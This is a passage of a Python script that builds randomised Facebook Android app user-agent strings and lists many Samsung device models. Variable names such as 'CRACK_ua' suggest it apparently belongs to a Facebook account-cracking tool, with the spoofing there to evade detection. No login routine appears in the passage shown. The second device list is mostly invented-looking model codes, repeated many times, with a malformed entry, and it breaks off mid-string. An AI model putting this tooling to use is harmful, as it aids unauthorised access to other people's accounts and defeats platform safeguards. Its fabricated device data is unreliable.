    uaz16 = "[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231020946;FBDM/{density=1.5,width=480,height=782};FBLC/en_GB;FBRV/0;FBCR/VodaCom-SA;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VFD 510;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaz17 = "[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021049;FBDM/{density=3.375,width=1080,height=2032};FBLC/it_IT;FBRV/232416429;FBCR/1 MOBILE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/FIG-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz18 = "[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231020883;FBDM/{density=3.0,width=1080,height=1792};FBLC/en_US;FBRV/233720555;FBCR/Telekom.de;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VTR-L09;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz19 = "[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537805;FBDM/{density=2.75,width=1080,height=2131};FBLC/uk_UA;FBRV/387081651;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz20 = "[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897985;FBDM/{density=3.375,width=1080,height=1920};FBLC/ru_RU;FBRV/374252804;FBCR/A1 BY;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    agent = random.choice([uaz,uaz1,uaz2,uaz3,uaz4,uaz5,uaz6,uaz7,uaz8,uaz9,uaz10,uaz11,uaz12,uaz13,uaz14,uaz15,uaz16,uaz17,uaz18,uaz19,uaz20])
    xyx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + agent
    return xyx
#----------------------------[DEF4]--------------------------------------------------------------------------------------------------------------------------------#
def DEF4():
    fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
    enCRACK1 = ['en_GB','en_US']
    CRACKfban1 = [ 'MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
    CRACKsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Zong','Jazz','Etisalat','null','','']
    modelxxx =  ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    gtt =random.choice(modelxxx)
    android_version=str(random.randrange(6,13))
    fbav = str(random.randint(111,111))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))
    fbbv = str(random.randint(111111111,999999999))
    lc = random.choice(enCRACK1)
    cr = random.choice(CRACKsim1)
    CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    return CRACK_ua
#----------------------------[DEF4]--------------------------------------------------------------------------------------------------------------------------------#
def nxp():
    a="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
    b="Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
    c="Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Raspbian Chromium/74.0.3729.157 Chrome/74.0.3729.157 Safari/537.36"
    d="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
    e="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.24 Safari/537.36"
    f="Mozilla/5.0 (X11; Fedora;Linux x86; rv:60.0) Gecko/20100101 Firefox/60.0,"
    h="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
    i="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
    j="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0,"
    k="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0,"
    l="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
    m="Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0,"
    n="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0,"
    return random.choice([a,b,c,d,e,f,h,i,j,k,l,m,n])

samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
samsung2 = ['GTH896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T;X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-